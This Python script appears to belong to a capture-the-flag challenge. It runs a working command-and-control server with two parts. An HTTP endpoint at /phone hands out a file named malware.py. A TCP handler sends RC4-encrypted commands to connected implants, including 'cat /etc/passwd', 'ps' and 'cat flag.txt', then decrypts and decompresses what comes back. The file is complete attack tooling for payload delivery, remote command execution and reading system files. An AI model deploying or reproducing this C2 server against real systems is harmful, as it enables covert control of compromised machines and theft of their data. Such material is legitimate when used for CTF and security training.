#!/usr/bin/env python3

import http.server
import secrets
import signal
import socketserver
import struct
import sys
import threading
import time
import zlib

HOST = sys.argv[1]
HTTP_PORT = int(sys.argv[2])
C2_PORT = int(sys.argv[3])
Handler = http.server.SimpleHTTPRequestHandler

class C2HTTPServer(http.server.SimpleHTTPRequestHandler):
    def _set_headers(self, content_type):
        self.send_response(200)
        self.send_header("Content-type", content_type)
        self.end_headers()

    def do_GET(self):
        if self.path == '/phone':
            self._set_headers('text/plain')
            with open('malware.py', 'rb') as fin:
                malware = fin.read()
                self.wfile.write(malware)
            return

        return http.server.SimpleHTTPRequestHandler.do_GET(self)

commands_to_send = [
    'id',
    'ls /etc',
    'cat /etc/passwd',
    'ps',
    'cat flag.txt',
]


def rc4_init(key):
    rc4_state = [i for i in range(256)]
    i = 0
    for j in range(256):
        i = (i + rc4_state[j] + key[j % len(key)]) & 0xFF
        rc4_state[j], rc4_state[i] = rc4_state[i], rc4_state[j]

    return rc4_state

def rc4_stream(rc4_state):
    i = 0
    j = 0
    while True:
        i = (1 + i) % 256
        j = (rc4_state[i] + j) % 256
        tmp = rc4_state[j]
        rc4_state[j] = rc4_state[i]
        rc4_state[i] = tmp
        yield rc4_state[(rc4_state[i] + rc4_state[j]) % 256]  

class C2Server(socketserver.BaseRequestHandler):
    def handle(self):
        print(f'Client connected: {self.client_address[0]}:{self.client_address[1]}')
        
        session_key = secrets.token_bytes(16)
        session_key_enc = bytes(x ^ 0x42 for x in session_key)
        self.request.sendall(session_key_enc)
        
        rc4s = rc4_init(struct.pack('<Q', int(time.time())//10) + session_key)
        rc4 = rc4_stream(rc4s)
        for cmd in commands_to_send:
            print(f'Sending command: {cmd}')
            cmd_enc = bytes(x^y for x,y in zip(rc4, cmd.encode()))
            self.request.sendall(cmd_enc)
            res_enc = self.request.recv(1024).strip()
            if len(res_enc) == 0:
                break
            res = bytes(x^y for x,y in zip(rc4, res_enc))
            res = zlib.decompress(res).decode()
            print(f'Received result: {res}')
            if 'flag.txt' in cmd:
                assert 'SSM{' in res

        print(f'Client disconnected: {self.client_address[0]}:{self.client_address[1]}')

def terminator(servers):
    def terminate(signal, frame):
        for s in servers:
            s.shutdown()
    return terminate

if __name__ == "__main__":
    print(f'Starting servers - C2: {HOST}:{C2_PORT} - HTTP: {HOST}:{HTTP_PORT}')
    with socketserver.TCPServer((HOST, C2_PORT), C2Server, False) as c2_server:
        with socketserver.TCPServer((HOST, HTTP_PORT), C2HTTPServer, False) as http_server:
            c2_server.allow_reuse_address = True
            c2_server.server_bind()
            c2_server.server_activate()
            c2_thread = threading.Thread(name='C2 thread', target=c2_server.serve_forever)

            http_server.allow_reuse_address = True
            http_server.server_bind()
            http_server.server_activate()
            http_thread = threading.Thread(name='HTTP thread', target=http_server.serve_forever)
            
            term = terminator([http_server, c2_server])
            signal.signal(signal.SIGTERM, term)
            signal.signal(signal.SIGINT, term)
            
            c2_thread.start()
            http_thread.start()

            http_thread.join()
            c2_thread.join()

